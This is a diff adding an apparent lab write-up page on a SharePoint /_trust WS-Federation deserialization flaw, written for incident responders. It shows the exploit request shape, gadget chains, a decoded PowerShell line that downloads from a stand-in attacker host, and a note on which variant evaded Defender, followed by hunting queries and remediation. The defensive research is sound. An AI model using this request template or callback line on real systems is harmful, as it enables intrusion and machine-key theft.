@@ -1,0 +1,354 @@
+<title>SharePoint /_trust Deserialization — wismansec</title>
+<style>
+  :root{
+    /* dark is the brand-primary ground */
+    --ground:#0B0F10; --surface:#12191a; --surface-2:#17201F; --code-bg:#090D0E;
+    --ink:#EDF1EF; --strong:#F2F5F3; --muted:#93A29F; --faint:#5d6d6a; --line:#1f2b29;
+    --accent:#AE4DFF; --accent-soft:#221036;
+    --offense:#FF4A4A; --offense-soft:#2a1113; --defense:#3E9BFF; --defense-soft:#0e2138;
+    --font-sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --font-mono:ui-monospace,"DejaVu Sans Mono","Cascadia Code","JetBrains Mono",Menlo,Consolas,monospace;
+    --measure:68ch; --wide:1000px;
+  }
+  @media (prefers-color-scheme:light){
+    :root{
+      --ground:#F2F5F3; --surface:#ffffff; --surface-2:#eaefec; --code-bg:#eef2ef;
+      --ink:#0C1315; --strong:#0B0F10; --muted:#55625f; --faint:#8a9793; --line:#dbe2df;
+      --accent:#7231C4; --accent-soft:#f0e7fb;
+      --offense:#cf2f2f; --offense-soft:#f8e2e2; --defense:#1f6fd0; --defense-soft:#e2eefb;
+    }
+  }
+  :root[data-theme="dark"]{
+    --ground:#0B0F10; --surface:#12191a; --surface-2:#17201F; --code-bg:#090D0E;
+    --ink:#EDF1EF; --strong:#F2F5F3; --muted:#93A29F; --faint:#5d6d6a; --line:#1f2b29;
+    --accent:#AE4DFF; --accent-soft:#221036;
+    --offense:#FF4A4A; --offense-soft:#2a1113; --defense:#3E9BFF; --defense-soft:#0e2138;
+  }
+  :root[data-theme="light"]{
+    --ground:#F2F5F3; --surface:#ffffff; --surface-2:#eaefec; --code-bg:#eef2ef;
+    --ink:#0C1315; --strong:#0B0F10; --muted:#55625f; --faint:#8a9793; --line:#dbe2df;
+    --accent:#7231C4; --accent-soft:#f0e7fb;
+    --offense:#cf2f2f; --offense-soft:#f8e2e2; --defense:#1f6fd0; --defense-soft:#e2eefb;
+  }
+
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--ground);color:var(--ink);font-family:var(--font-sans);
+    font-size:17px;line-height:1.65;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+  .wrap{max-width:var(--wide);margin:0 auto;padding:0 24px}
+  .col{max-width:var(--measure)}
+  a{color:var(--accent);text-underline-offset:2px}
+
+  .eyebrow{font-family:var(--font-mono);font-size:.74rem;letter-spacing:.06em;color:var(--accent);font-weight:600}
+  .eyebrow::before{content:"~$ ";color:var(--faint)}
+  .muted{color:var(--muted)}
+
+  /* header — brand banner treatment: near-black ground, purple radial glow, faint scanlines */
+  header.hero{position:relative;overflow:hidden;border-bottom:1px solid var(--line);
+    background:
+      radial-gradient(120% 140% at 88% 120%, color-mix(in srgb,var(--accent) 26%,transparent), transparent 55%),
+      radial-gradient(90% 120% at 30% 18%, var(--surface-2), transparent 60%),
+      var(--ground);}
+  header.hero::after{content:"";position:absolute;inset:0;pointer-events:none;
+    background:repeating-linear-gradient(180deg,transparent 0 2px,rgba(255,255,255,.014) 2px 3px);}
+  .hero .wrap{position:relative;padding-top:56px;padding-bottom:42px}
+  .lockup{font-family:var(--font-mono);font-weight:700;font-size:1rem;color:var(--muted);letter-spacing:-.5px}
+  .lockup b{color:var(--strong)}
+  .lockup .cur{display:inline-block;width:.55em;height:1.05em;background:var(--accent);
+    vertical-align:-.16em;margin-left:.12em;border-radius:2px}
+  h1{font-family:var(--font-mono);font-size:clamp(1.9rem,4.2vw,2.8rem);line-height:1.08;letter-spacing:-.02em;
+    margin:1.3rem 0 .5rem;color:var(--strong);font-weight:700;text-wrap:balance;max-width:22ch}
+  .lede{font-size:1.14rem;color:var(--muted);max-width:60ch;margin:0}
+  .meta{display:flex;flex-wrap:wrap;gap:8px 10px;margin-top:22px;font-family:var(--font-mono);font-size:.76rem}
+  .meta span{border:1px solid var(--line);border-radius:6px;padding:5px 11px;color:var(--muted);
+    background:color-mix(in srgb,var(--surface) 70%,transparent);white-space:nowrap}
+  .meta span b{color:var(--ink);font-weight:600}
+  .meta .redact{color:var(--offense)}
+
+  main .wrap{padding-top:16px;padding-bottom:72px}
+  section{padding-top:44px}
+  h2{font-family:var(--font-mono);font-size:1.4rem;letter-spacing:-.01em;color:var(--strong);
+    margin:.4rem 0 .6rem;font-weight:700;text-wrap:balance}
+  h3{font-size:1.05rem;margin:1.6rem 0 .3rem;color:var(--strong);font-weight:700}
+  p{margin:.7rem 0}
+  .sec-head{border-top:1px solid var(--line);padding-top:14px}
+
+  .call{border:1px solid var(--line);border-left:3px solid var(--accent);background:var(--surface);
+    border-radius:8px;padding:18px 20px;margin:18px 0}
+  .call.off{border-left-color:var(--offense)}
+  .call.def{border-left-color:var(--defense)}
+  .call h4{margin:0 0 .5rem;font-family:var(--font-mono);font-size:.74rem;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);font-weight:600}
+  .call ul{margin:.4rem 0 0;padding-left:1.1rem}
+  .call li{margin:.35rem 0}
+
+  pre{background:var(--code-bg);border:1px solid var(--line);border-radius:8px;padding:14px 16px;
+    overflow-x:auto;margin:14px 0}
+  code{font-family:var(--font-mono);font-size:.86em}
+  pre code{font-size:.82rem;line-height:1.55;color:var(--ink)}
+  p code,li code,td code{background:var(--surface-2);border:1px solid var(--line);border-radius:5px;
+    padding:.05em .38em;font-size:.82em;white-space:nowrap}
+  .redact{color:var(--offense);font-style:normal}
+
+  .tablecard{border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:18px 0;background:var(--surface)}
+  .scroll{overflow-x:auto}
+  table{border-collapse:collapse;width:100%;font-size:.9rem;min-width:720px}
+  caption{caption-side:bottom;text-align:left;color:var(--faint);font-size:.78rem;padding:10px 14px;font-family:var(--font-mono)}
+  th,td{text-align:left;padding:11px 14px;border-bottom:1px solid var(--line);vertical-align:top}
+  thead th{font-family:var(--font-mono);font-size:.7rem;letter-spacing:.08em;text-transform:uppercase;
+    color:var(--muted);font-weight:600;background:var(--surface-2)}
+  tbody tr:last-child td{border-bottom:0}
+  td.inv{font-family:var(--font-mono);font-size:.82rem;color:var(--strong);font-weight:600;white-space:nowrap}
+  td.tree{font-family:var(--font-mono);font-size:.78rem;color:var(--ink);white-space:nowrap}
+  .dim{color:var(--faint)}
+
+  .chip{display:inline-block;font-family:var(--font-mono);font-size:.7rem;font-weight:600;letter-spacing:.02em;
+    padding:3px 9px;border-radius:6px;border:1px solid transparent;white-space:nowrap}
+  .chip.off{color:var(--offense);background:var(--offense-soft);border-color:color-mix(in srgb,var(--offense) 34%,transparent)}
+  .chip.def{color:var(--defense);background:var(--defense-soft);border-color:color-mix(in srgb,var(--defense) 34%,transparent)}
+  .chip.na{color:var(--faint);background:var(--surface-2);border-color:var(--line)}
+  .chip.key{color:var(--accent);background:var(--accent-soft);border-color:color-mix(in srgb,var(--accent) 40%,transparent)}
+
+  .trees{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:16px 0}
+  .treecard{border:1px solid var(--line);border-radius:8px;background:var(--surface);padding:14px 16px}
+  .treecard .tag{font-family:var(--font-mono);font-size:.72rem;font-weight:600;margin-bottom:8px;display:flex;
+    justify-content:space-between;align-items:center;gap:8px}
+  .treecard pre{margin:0;border:0;background:transparent;padding:0;font-size:.8rem;color:var(--ink)}
+  @media (max-width:640px){.trees{grid-template-columns:1fr}}
+
+  ol.steps{counter-reset:s;list-style:none;padding:0;margin:14px 0;max-width:var(--measure)}
+  ol.steps li{position:relative;padding:12px 12px 12px 46px;border:1px solid var(--line);border-radius:8px;
+    background:var(--surface);margin:10px 0}
+  ol.steps li::before{counter-increment:s;content:counter(s);position:absolute;left:12px;top:12px;
+    width:24px;height:24px;border-radius:6px;background:var(--accent-soft);color:var(--accent);
+    font-family:var(--font-mono);font-size:.8rem;font-weight:700;display:grid;place-items:center}
+  ol.steps li b{color:var(--strong)}
+
+  footer{border-top:1px solid var(--line);background:var(--surface);margin-top:40px}
+  footer .wrap{padding:26px 24px;font-size:.85rem;color:var(--muted)}
+  footer .eyebrow{display:block;margin-bottom:8px}
+
+  @media (prefers-reduced-motion:no-preference){
+    .blink{animation:blink 1.2s steps(1) infinite}
+    @keyframes blink{50%{opacity:0}}
+    .fade{opacity:0;transform:translateY(8px);animation:rise .6s ease forwards}
+    @keyframes rise{to{opacity:1;transform:none}}
+  }
+</style>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="lockup fade">~$ <b>wismansec</b><span class="cur blink"></span></div>
+    <h1 class="fade">SharePoint /_trust WS-Federation deserialization</h1>
+    <p class="lede fade">One unauthenticated sign-in request yields code execution in
+      <code>w3wp.exe</code> — and the same primitive steals the farm machine keys with no process,
+      no beacon in a default-config farm. A lab reconstruction, built to show responders exactly what to hunt.</p>
+    <div class="meta fade">
+      <span>Affected&nbsp; <b>SharePoint Server 2016 · 2019 · Subscription Edition</b></span>
+      <span>Fix&nbsp; <b>July 2026 · KB5002882</b></span>
+      <span>CVEs (CISA KEV)&nbsp; <b>2026-50522 · 45659 · 56164 · 58644</b></span>
+      <span>Scope&nbsp; <b>isolated personal lab</b></span>
+      <span class="redact">lab hosts · keys · OAST redacted</span>
+      <span><a href="https://github.com/WismanSec/sharepoint-2026-poc" style="color:var(--accent);text-decoration:none;font-weight:600">↳ source &amp; scripts on GitHub</a></span>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="wrap">
+
+    <section style="padding-top:30px">
+      <div class="call def">
+        <h4>TL;DR for responders</h4>
+        <ul>
+          <li>A single unauthenticated <code>POST /_trust/default.aspx</code> carrying a malicious
+            <code>SecurityContextToken</code> triggers <b>BinaryFormatter deserialization</b> in
+            <code>w3wp.exe</code> → <b>RCE as the web-app pool identity</b>.</li>
+          <li>The same primitive dumps the farm <b>machine keys</b> entirely in-process — in a
+            default-config farm, <b>no child process, no Defender alert, no beacon</b> (AMSI/EDR
+            posture can change this — see Trap 3). Stolen keys forge <code>__VIEWSTATE</code>/auth
+            tokens <b>that survive patching</b>.</li>
+          <li><b>Patching is not enough — rotate machine keys</b>, and hunt the <code>/_trust</code>
+            request: it is the one artifact present in <em>every</em> variant.</li>
+        </ul>
+      </div>
+    </section>
+
+    <section>
+      <div class="col">
+        <div class="sec-head"><span class="eyebrow">01 vulnerability</span></div>
+        <h2>A sign-in response that deserializes</h2>
+        <p>SharePoint exposes a WS-Federation passive sign-in endpoint at
+          <code>/_trust/default.aspx</code>. A crafted response embeds a
+          <code>SecurityContextToken</code> whose <code>&lt;Cookie&gt;</code> is a base64,
+          DEFLATE-compressed <b>BinaryFormatter</b> stream — decompressed and deserialized
+          <b>without type restriction</b>, so a <code>ysoserial.net</code> gadget chain executes
+          inside the worker.</p>
+      </div>
+      <pre class="col" style="max-width:var(--measure)"><code>POST /_trust/default.aspx HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&gt;…
+  &lt;SecurityContextToken&gt;&lt;Cookie&gt;BASE64(DEFLATE(BinaryFormatter payload))&lt;/Cookie&gt;…</code></pre>
+    </section>
+
+    <section>
+      <div class="col">
+        <div class="sec-head"><span class="eyebrow">02 capability</span></div>
+        <h2>Two chains from one primitive</h2>
+      </div>
+      <div class="tablecard col" style="max-width:var(--measure)">
+        <div class="scroll"><table style="min-width:520px">
+          <thead><tr><th>Chain</th><th>Gadget</th><th>Effect</th><th>Output</th></tr></thead>
+          <tbody>
+            <tr><td class="inv">OOB RCE</td><td><code>TypeConfuseDelegate</code></td>
+              <td>code exec as pool identity</td><td>out-of-band beacon</td></tr>
+            <tr><td class="inv">Key dump</td><td class="dim"><code>ActivitySurrogate*</code></td>
+              <td>Validation + Decryption keys</td><td>inline in response</td></tr>
+          </tbody>
+        </table></div>
+      </div>
+    </section>
+
+    <section>
+      <div class="sec-head col"><span class="eyebrow">03 results</span></div>
+      <h2 class="col">Invocation → artifact matrix</h2>
+      <p class="col">Every row is one real detonation; artifacts pulled from the SIEM and OOB
+        listener per run. Identity throughout: <code>LAB\sp_pool</code>, High integrity.
+        <span class="muted">Chips:</span> <span class="chip off">offense won</span>
+        <span class="chip def">defense fired</span></p>
+      <div class="tablecard">
+        <div class="scroll">
+          <table>
+            <thead><tr>
+              <th>Invocation</th><th>Process tree</th><th>Defender</th><th>OOB beacon</th><th>Primary artifacts</th>
+            </tr></thead>
+            <tbody>
+              <tr>
+                <td class="inv">OOB RCE<br><span class="dim">default</span></td>
+                <td class="tree">w3wp → cmd → powershell → conhost</td>
+                <td><span class="chip def">WebshellLauncher.A</span></td>
+                <td><span class="chip off">landed · race</span></td>
+                <td>4688 tree · Defender 1116/1117 · <code>/_trust</code></td>
+              </tr>
+              <tr>
+                <td class="inv">OOB RCE<br><span class="dim">-RawCmd</span></td>
+                <td class="tree">w3wp → powershell → conhost</td>
+                <td><span class="chip off">no detection</span></td>
+                <td><span class="chip off">landed</span></td>
+                <td>4688 tree · <code>/_trust</code> · beacon</td>
+              </tr>
+              <tr>
+                <td class="inv">OOB RCE<br><span class="dim">-DropFile</span></td>
+                <td class="tree">w3wp → powershell</td>
+                <td><span class="chip off">no detection</span></td>
+                <td><span class="chip off">landed</span></td>
+                <td>file write → <code>…\LAYOUTS\</code></td>
+              </tr>
+              <tr>
+                <td class="inv">OOB RCE<br><span class="dim">-Diag</span></td>
+                <td class="tree">w3wp → powershell → whoami</td>
+                <td><span class="chip off">no detection</span></td>
+                <td><span class="chip off">landed</span></td>
+                <td>env disclosure exfil</td>
+              </tr>
+              <tr>
+                <td class="inv">Key dump</td>
+                <td class="tree dim">— in-process —</td>
+                <td><span class="chip off">no detection</span></td>
+                <td><span class="chip na">none</span></td>
+                <td><span class="chip key">stealth</span> only the <code>/_trust</code> POST + response</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <caption>Status is not a reliable success signal — successful runs returned both HTTP 200 and connection-reset.</caption>
+      </div>
+
+      <h3 class="col">Same exploit, two trees — only one is seen</h3>
+      <div class="trees">
+        <div class="treecard">
+          <div class="tag"><span>default</span><span class="chip def">detected</span></div>
+<pre><code>w3wp.exe
+└─ cmd.exe  /c powershell
+   └─ powershell.exe  -EncodedCommand …
+      └─ conhost.exe</code></pre>
+        </div>
+        <div class="treecard">
+          <div class="tag"><span>-RawCmd</span><span class="chip off">evades</span></div>
+<pre><code>w3wp.exe
+└─ powershell.exe  -EncodedCommand …
+   └─ conhost.exe
+
+</code></pre>
+        </div>
+      </div>
+
+      <p class="col">The command line recovers verbatim from <b>Security 4688</b> — the encoding is
+        not obfuscation:</p>
+      <pre class="col" style="max-width:var(--measure)"><code>powershell.exe -EncodedCommand &lt;base64&gt;
+  # base64(UTF-16LE) → iwr -UseBasicParsing 'http://&lt;attacker-oast&gt;/c'</code></pre>
+      <p class="col"><code>-Diag</code> disclosure captured at the OOB listener:</p>
+      <pre class="col" style="max-width:var(--measure)"><code>{ "host":"SHAREPOINT01", "who":"LAB\\sp_pool", "v":"5.1.20348.558", "lm":"FullLanguage" }</code></pre>
+    </section>
+
+    <section>
+      <div class="sec-head col"><span class="eyebrow">04 detection &amp; hunting</span></div>
+      <h2 class="col">What to hunt — and two traps</h2>
+      <p class="col">The web request is the only artifact common to RCE <em>and</em> the stealthy
+        key dump. Start here:</p>
+      <pre class="col" style="max-width:var(--measure)"><code>uri_path = "/_trust/default.aspx" AND http_method = "POST"
+  AND body contains "wa=wsignin1.0"
+  AND body contains "RequestSecurityTokenResponse"</code></pre>
+
+      <div class="call off col" style="max-width:var(--measure)">
+        <h4>Trap 1 — don't key on <code>w3wp → cmd</code></h4>
+        <p style="margin:.2rem 0 0">The <code>-RawCmd</code> variant is <code>w3wp → powershell</code>
+          directly and drew <b>zero</b> Defender events. Hunt <code>w3wp.exe</code> spawning
+          <code>powershell.exe</code> <b>with no cmd.exe hop</b>, and decode any
+          <code>-EncodedCommand</code> straight from 4688.</p>
+      </div>
+      <div class="call off col" style="max-width:var(--measure)">
+        <h4>Trap 2 — detection ≠ prevention</h4>
+        <p style="margin:.2rem 0 0">On the cmd tree Defender fired <code>WebshellLauncher.A</code>
+          and <em>removed</em> the chain — yet the beacon (DNS + HTTP) still completed first. On any
+          such detection, <b>also pull DNS/proxy/egress</b> for the callback domain around that time.</p>
+      </div>
+      <div class="call off col" style="max-width:var(--measure)">
+        <h4>Trap 3 — the key dump is stealthy, but AMSI-dependent</h4>
+        <p style="margin:.2rem 0 0">In this default-config farm (Defender AV) the key dump produced
+          <b>no 4688 child, no Defender event, and no beacon</b> — it runs in-process in
+          <code>w3wp</code>, leaving only the <code>/_trust</code> POST + anomalous response.
+          But visibility is <b>AMSI/EDR-dependent</b>: with SharePoint's AMSI integration enabled the
+          request body is exposed to AV scanning, and a <b>CrowdStrike</b> detection of this chain was
+          observed separately. Don't assume invisibility — verify your AMSI posture and hunt the request.</p>
+      </div>
+    </section>
+
+    <section>
+      <div class="sec-head col"><span class="eyebrow">05 remediation</span></div>
+      <h2 class="col">Fix, then revoke</h2>
+      <ol class="steps">
+        <li><b>Patch</b> to the fixed SharePoint build (July 2026 / KB5002882).</li>
+        <li><b>Rotate machine keys</b> farm-wide (<code>Set-SPMachineKey</code> + <code>IISReset</code>).
+          Patching does <b>not</b> revoke keys an attacker already stole.</li>
+        <li><b>Hunt historical IIS logs</b> for the <code>/_trust</code> signature; if present,
+          assume key compromise.</li>
+        <li><b>Review for forged <code>__VIEWSTATE</code></b> / anomalous auth after first-seen.</li>
+      </ol>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span class="eyebrow">authorized research only</span>
+    Performed on isolated, personally-owned lab hardware and accounts against a build intentionally
+    left unpatched. The underlying issue is fixed by the vendor. Provided for defensive research,
+    detection engineering, and education. Machine-key material, internal hosts/IPs, and callback
+    domains are redacted. Do not run against systems you do not own and are not authorized to test.
+    <div style="margin-top:12px" class="muted">wismansec ·
+      <a href="https://github.com/WismanSec/sharepoint-2026-poc">github.com/WismanSec/sharepoint-2026-poc</a> ·
+      MITRE ATT&amp;CK T1190 · T1059.001 · T1552 · T1550</div>
+  </div>
+</footer>
